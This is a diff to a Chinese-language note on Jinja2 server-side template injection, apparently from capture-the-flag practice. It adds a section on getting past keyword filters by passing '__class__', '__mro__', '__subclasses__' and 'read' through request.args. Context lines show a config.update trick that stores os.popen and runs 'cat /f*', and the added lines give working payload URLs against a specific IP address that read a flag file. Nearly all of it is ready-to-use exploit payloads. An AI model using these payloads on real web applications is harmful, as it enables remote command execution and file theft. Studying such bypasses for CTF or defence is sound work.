@@ -293,3 +293,16 @@ set+update方法绕过长度限制最大长度40
 {{config.update(p=config.o.popen)}}
 {{config.p(request.args.c).read()}}&c=cat /f*
 ```
+
+
+
+^
+## **使用request对象绕过**
+发现系统过滤了class、 subclasses、 read等关键方法。
+但是并未过滤request。
+```
+http://111.200.241.244:62326/{{''[request.args.a]}}?a=__class__
+
+http://111.200.241.244:62326/register.php/{{''[request.args.a][request.args.b][2][request.args.c]()[40]('/opt/flag_1de36dff62a3a54ecfbc6e1fd2ef0ad1.txt')[request.args.d]()}}?a=__class__&b=__mro__&c=__subclasses__&d=read
+```
+
